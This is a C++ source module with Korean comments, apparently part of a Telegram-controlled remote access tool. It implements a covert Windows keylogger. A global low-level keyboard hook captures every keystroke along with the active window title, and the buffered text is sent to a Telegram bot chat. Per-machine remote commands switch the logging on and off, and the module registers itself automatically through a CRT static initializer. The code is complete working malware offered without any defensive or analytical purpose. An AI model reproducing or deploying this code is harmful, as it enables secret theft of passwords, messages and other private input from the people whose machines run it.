// Command_Key.cpp  (최종본: 기본 모드 / 한글 변환 제거 / 백스페이스는 "[backspace]" 토큰만 기록)
// 기능:
//  - /[HWID] key        → 한 블럭(텍스트+버튼) UI
//  - /[HWID] key on/off → 시작/중지 (상태 변경시에만 안내, 도배 방지)
//  - 키 입력 버퍼링(2초 동안 추가 입력 없을 때 전송):
//        [마지막활성창]
//        <입력 버퍼 원문>   ← Backspace는 "[backspace]"로만 기록
//  - Shift/특수문자/대소문자 보정
//  - UTF-8 버튼(400 방지), 3초 UI 쿨다운, .CRT$XCU 자동등록

#include "Commands.h"
#include "TelegramApi.h"
#include "Config.h"

#define NOMINMAX
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <unordered_map>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "winhttp.lib")

// ==============================
// 전역 상태
// ==============================
static HHOOK        g_hHook = nullptr;
static std::wstring g_buffer;       // 원문 버퍼 (Backspace는 [backspace] 토큰으로만 기록)
static std::mutex   g_mutex;
static UINT_PTR     g_timerId = 0;
static std::atomic<bool> g_running{ false };
static long long    g_chatId = 0;

// ==============================
// 유틸
// ==============================
static std::wstring GetSpecialKeyName(WPARAM vk) {
    switch (vk) {
    case VK_RETURN:  return L"[Enter]";
    case VK_TAB:     return L"[Tab]";
    case VK_BACK:    return L"[backspace]"; // ← 단순 토큰
    case VK_ESCAPE:  return L"[Esc]";
    case VK_SPACE:   return L" ";
    case VK_CONTROL: return L"[Ctrl]";
    case VK_SHIFT:   return L"[Shift]";
    case VK_MENU:    return L"[Alt]";
    case VK_LWIN:
    case VK_RWIN:    return L"[Win]";
    case VK_DELETE:  return L"[Delete]";
    case VK_LEFT:    return L"[Left]";
    case VK_RIGHT:   return L"[Right]";
    case VK_UP:      return L"[Up]";
    case VK_DOWN:    return L"[Down]";
    default:         return L"";
    }
}

static std::wstring GetActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"(알 수 없음)";
    wchar_t buf[256];
    int len = GetWindowTextW(hwnd, buf, 256);
    return (len > 0) ? std::wstring(buf, len) : L"(제목 없음)";
}

// ToUnicode용 키상태 구성 (Shift/Caps/Num/Scroll + 좌/우 모디파이어)
static void BuildKeyState(BYTE ks[256]) {
    ZeroMemory(ks, 256);
    auto setDown = [&](int vk) { if (GetAsyncKeyState(vk) & 0x8000) ks[vk] = 0x80; };
    setDown(VK_SHIFT);   setDown(VK_LSHIFT);   setDown(VK_RSHIFT);
    setDown(VK_CONTROL); setDown(VK_LCONTROL); setDown(VK_RCONTROL);
    setDown(VK_MENU);    setDown(VK_LMENU);    setDown(VK_RMENU);
    if (GetKeyState(VK_CAPITAL) & 1) ks[VK_CAPITAL] = 1;
    if (GetKeyState(VK_NUMLOCK) & 1) ks[VK_NUMLOCK] = 1;
    if (GetKeyState(VK_SCROLL) & 1) ks[VK_SCROLL] = 1;
}

// ==============================
// 전송(2초 무입력 시): [마지막활성창]\n<원문>
// ==============================
static VOID CALLBACK TimerProc(HWND, UINT, UINT_PTR, DWORD) {
    std::wstring msg;
    {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (!g_buffer.empty()) { msg.swap(g_buffer); }
    }
    if (msg.empty() || g_chatId == 0) return;

    std::wstring title = GetActiveWindowTitle();
    std::wstring out = L"[" + title + L"]\n" + msg;

    SendText(g_chatId, WToUtf8(out)); // UTF-8 전송
}

// ==============================
// 키보드 후킹
// ==============================
static LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        const KBDLLHOOKSTRUCT* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

        // ── Backspace는 삭제하지 않고 "[backspace]" 토큰만 기록
        if (kb->vkCode == VK_BACK) {
            {
                std::lock_guard<std::mutex> lock(g_mutex);
                g_buffer += L"[backspace]";
            }
            if (g_timerId) KillTimer(NULL, g_timerId);
            g_timerId = SetTimer(NULL, 1, 2000, TimerProc);
            return CallNextHookEx(g_hHook, code, wParam, lParam);
        }

        // ── 나머지 키: ToUnicode로 실제 글자/기호 추출 (Shift/특수문자/대소문자 보정)
        BYTE ks[256]; BuildKeyState(ks);
        UINT scan = kb->scanCode;
        if (kb->flags & LLKHF_EXTENDED) scan |= 0xE000;

        WCHAR buf[16] = { 0 };
        int r = ToUnicode(kb->vkCode, scan, ks, buf, 16, 0);
        if (r < 0) { WCHAR dummy[16]; ToUnicode(kb->vkCode, scan, ks, dummy, 16, 0); r = 0; } // dead-key 초기화

        std::wstring keyText;
        if (r > 0) {
            keyText.assign(buf, buf + r);
            // 알파벳 1글자면 Shift ^ Caps 로 대소문자 보정
            if (keyText.size() == 1 && iswalpha(keyText[0])) {
                bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                bool caps = (GetKeyState(VK_CAPITAL) & 1) != 0;
                bool upper = shift ^ caps;
                keyText[0] = upper ? towupper(keyText[0]) : towlower(keyText[0]);
            }
            // 숫자+Shift(1→!) 등은 BuildKeyState로 자동 반영됨
        }
        else {
            keyText = GetSpecialKeyName(kb->vkCode); // 예: [Enter], [Tab], 공백 등
        }

        {
            std::lock_guard<std::mutex> lock(g_mutex);
            g_buffer += keyText;
        }
        if (g_timerId) KillTimer(NULL, g_timerId);
        g_timerId = SetTimer(NULL, 1, 2000, TimerProc);
    }
    return CallNextHookEx(g_hHook, code, wParam, lParam);
}

static DWORD WINAPI HookThread(LPVOID) {
    MSG msg;
    g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandleW(NULL), 0);
    if (!g_hHook) return 0;
    while (GetMessageW(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessageW(&msg); }
    UnhookWindowsHookEx(g_hHook); g_hHook = nullptr;
    return 0;
}

static bool StartKeyLogger(long long chatId) {
    if (g_running.exchange(true)) return false; // 이미 ON
    g_chatId = chatId;
    CreateThread(NULL, 0, HookThread, NULL, 0, NULL);
    return true;
}
static bool StopKeyLogger() {
    if (!g_running.exchange(false)) return false; // 이미 OFF
    if (g_hHook) { UnhookWindowsHookEx(g_hHook); g_hHook = nullptr; }
    if (g_timerId) { KillTimer(NULL, g_timerId); g_timerId = 0; }
    g_chatId = 0;
    return true;
}

// ==============================
// 버튼 UI (UTF-8) + 3초 쿨다운
// ==============================
struct UiKey {
    long long chatId; std::string hwid;
    bool operator==(const UiKey& o) const noexcept { return chatId == o.chatId && hwid == o.hwid; }
};
struct UiKeyHash {
    size_t operator()(const UiKey& k) const noexcept {
        std::hash<long long> h1; std::hash<std::string> h2; return (h1(k.chatId) * 1315423911u) ^ h2(k.hwid);
    }
};
static std::unordered_map<UiKey, ULONGLONG, UiKeyHash> g_lastUiSend;
static std::mutex g_lastUiSendMu;

static bool ShouldThrottleUI(long long chatId, const std::string& hwid8, ULONGLONG ms = 3000) {
    std::lock_guard<std::mutex> lk(g_lastUiSendMu);
    ULONGLONG now = GetTickCount64(); UiKey k{ chatId, hwid8 };
    auto it = g_lastUiSend.find(k);
    if (it != g_lastUiSend.end()) {
        if (now - it->second < ms) return true;
        it->second = now; return false;
    }
    g_lastUiSend.emplace(k, now); return false;
}

// 라벨을 UTF-8로 만들어 form-urlencoded로 전송 (400 방지)
static bool SendTextWithButtons_Multi_Local(long long chatId,
    const std::wstring& textW,
    const std::vector<std::string>& labelsUtf8,
    const std::vector<std::string>& callbacks,
    int columns = 2)
{
    std::string markup = "{\"inline_keyboard\":[";
    const int n = (int)labelsUtf8.size();
    for (int i = 0; i < n; ) {
        if (i) markup += ",";
        markup += "[";
        for (int c = 0; c < columns && i < n; ++c, ++i) {
            if (c) markup += ",";
            markup += "{\"text\":\"" + JsonEscape(labelsUtf8[i]) +
                "\",\"callback_data\":\"" + JsonEscape(callbacks[i]) + "\"}";
        }
        markup += "]";
    }
    markup += "]}";

    std::string body = "chat_id=" + std::to_string(chatId) +
        "&text=" + UrlEncode(WToUtf8(textW)) +
        "&reply_markup=" + UrlEncode(markup);

    std::wstring path = L"/bot" + BOT_TOKEN + L"/sendMessage";
    std::string resp; bool ok = HttpPostForm(path, body, resp);
    return ok && resp.find("\"ok\":true") != std::string::npos;
}

static bool SendTextWithButtons_Multi_W(long long chatId,
    const std::wstring& textW,
    const std::vector<std::wstring>& labelsW,
    const std::vector<std::string>& callbacks,
    int columns = 2)
{
    std::vector<std::string> labelsUtf8; labelsUtf8.reserve(labelsW.size());
    for (const auto& w : labelsW) labelsUtf8.push_back(WToUtf8(w));
    return SendTextWithButtons_Multi_Local(chatId, textW, labelsUtf8, callbacks, columns);
}

// 한 블럭 전송 + 문구
static bool SendKeyUI(long long chatId, const std::string& hwid8) {
    if (ShouldThrottleUI(chatId, hwid8)) return true; // 3초 쿨다운

    std::wstring text =
        L"[" + std::wstring(hwid8.begin(), hwid8.end()) + L"] 키 모니터링\n"
        L"해당 PC의 키 모니터링을 시작할까요?";

    std::vector<std::wstring> labelsW = { L"시작", L"중지" };
    std::vector<std::string>  callbacks = {
        "/" + hwid8 + " key on",
        "/" + hwid8 + " key off"
    };
    return SendTextWithButtons_Multi_W(chatId, text, labelsW, callbacks, 2);
}

// ==============================
// /key 핸들러 + 자동 등록
// ==============================
static bool KeyHandler(long long chatId, const std::string& hwid8, const std::string& argsUtf8)
{
    auto trim = [](const std::string& s) {
        size_t a = s.find_first_not_of(" \t\r\n");
        size_t b = s.find_last_not_of(" \t\r\n");
        if (a == std::string::npos) return std::string();
        return s.substr(a, b - a + 1);
        };
    std::string arg = trim(argsUtf8);

    // 빈 인자 또는 "key"/"ui"/"menu" → UI
    if (arg.empty() || arg == "key" || arg == "ui" || arg == "menu") {
        return SendKeyUI(chatId, hwid8);
    }

    if (arg == "on" || arg == "start") {
        if (StartKeyLogger(chatId)) {
            SendText(chatId, WToUtf8(L"모니터링 시작: 키 입력이 감지되면 전송됩니다."));
        }
        return true;
    }
    if (arg == "off" || arg == "stop") {
        if (StopKeyLogger()) {
            SendText(chatId, WToUtf8(L"모니터링 중지."));
        }
        return true;
    }

    // 그 외 인자도 UI로 유도
    return SendKeyUI(chatId, hwid8);
}

namespace {
    struct KeyAutoreg { KeyAutoreg() { RegisterCommand("key", &KeyHandler); } };
    extern "C" void __cdecl __init_Command_Key() { static KeyAutoreg s_reg; }
    using InitFn = void(__cdecl*)();
#pragma section(".CRT$XCU", read)
    __declspec(allocate(".CRT$XCU")) InitFn p_init_Command_Key = __init_Command_Key;
}
